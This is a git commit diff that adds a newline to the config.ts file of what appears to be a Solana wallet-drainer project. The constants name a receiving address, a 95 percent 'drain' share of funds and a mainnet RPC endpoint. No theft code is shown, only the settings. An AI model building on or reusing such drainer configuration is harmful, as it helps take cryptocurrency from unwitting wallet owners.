bbfbf38543199220d382b1c93a250c87d61da223
ronzine <138832077+Romeo509@users.noreply.github.com>
2025-09-16 17:37:04 +0000

    Add newline at end of config.ts file

--- src/config.ts
+++ src/config.ts
@@ -2,4 +2,5 @@
 export const RECEIVER_ADDRESS = "QJAyXjVRuBRx3RRaDd7VKYXGkMTFvQqc8mjhEnJicBD";
 export const PERCENTAGE_TO_DRAIN = 95; // Percentage of funds to transfer
 export const SOLANA_NETWORK = 'https://solana-mainnet.rpc.extrnode.com/2bfc516c-ecfb-4cbc-a796-e9204db9e670';
-export const MINIMUM_BALANCE = 0.008; // Minimum balance in SOL required for transaction
+
+export const MINIMUM_BALANCE = 0.008; // Minimum balance in SOL required for transaction.
